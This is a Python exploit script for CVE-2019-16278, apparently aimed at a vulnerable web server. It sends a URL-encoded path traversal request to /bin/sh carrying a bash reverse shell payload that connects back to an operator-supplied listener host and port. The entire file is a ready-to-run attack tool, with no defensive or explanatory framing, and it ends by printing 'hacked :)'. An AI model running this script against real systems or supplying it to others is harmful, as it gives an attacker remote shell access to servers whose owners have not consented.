import argparse
import requests
import sys
from log_colors import *

# CVE-2019-16278
class CVE2019_16278:

    def __init__(self, url, lhost, lport):
        print (LogColors.BLUE + "target: " + url + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.s = requests.Session()
        #self.s.headers.update({"User-Agent" : "Mozilla/5.0"})
    
    # prepare rev shell payload
    def prepare_payload(self):
        print (LogColors.BLUE + "prepare payload..." + LogColors.ENDC)
        payload = '/bin/bash -c '
        payload += '"/bin/bash -i >& /dev/tcp/{}/{} 0>&1"'.format(self.lhost, self.lport)
        print (LogColors.YELLOW + payload + LogColors.ENDC)
        return payload

    # send payload
    def get_reverse_shell(self):
        print (LogColors.BLUE + "get revershe shell..." + LogColors.ENDC)
        headers = {"Content-Length" : "1"}
        payload = self.prepare_payload()
        try:
            r = self.s.post(self.url + "/.%0d./.%0d./.%0d./bin/sh", data = payload)
        except Exception as e:
            print (LogColors.RED + "failed to get rev shell :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully get rev shell. hacked :)" + LogColors.ENDC)
    
    # exploitation
    def exploit(self):
        self.get_reverse_shell()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-I','--lhost', required = True, help = "revshell listener host")
    parser.add_argument('-P','--lport', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2019_16278(url, lhost, lport)
    cve.exploit()

